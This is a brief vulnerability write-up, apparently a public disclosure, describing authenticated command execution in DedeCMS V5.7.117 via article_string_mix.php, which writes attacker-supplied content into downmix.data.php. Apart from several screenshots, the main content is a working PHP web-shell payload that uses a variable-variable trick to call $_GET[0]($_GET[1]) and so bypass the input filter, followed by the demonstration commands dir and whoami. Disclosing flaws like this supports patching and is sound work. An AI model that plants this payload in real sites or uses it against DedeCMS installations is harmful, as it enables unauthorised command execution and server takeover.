DedeCMS V5.7.117 version article_string_mix.php file exists command execution

https://dedecms.com/download  download address

![image-20250331103401188](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311034917.png)

![image-20250331103436971](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311034157.png)

This file requires a login background to access.

![image-20250331103902581](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311039630.png)

![image-20250331103656791](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311036921.png)

![image-20250331104026320](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311040486.png)

This place opens downmix.data.php and writes data to it. Although the  data content is filtered, we can still construct a bypass to achieve the effect of command execution.

![image-20250331104554179](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311045291.png)

write in

```
$a = '_GET';
$$a[0]($$a[1]);
```

Equivalent to:

```
$_GET[0]($_GET[1]); //Let 0 be the system and 1 be the code to execute.
```

![image-20250331104707639](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311047704.png)

dir

![image-20250331104620463](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311046598.png)

whoami

![image-20250331104639211](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503311046335.png)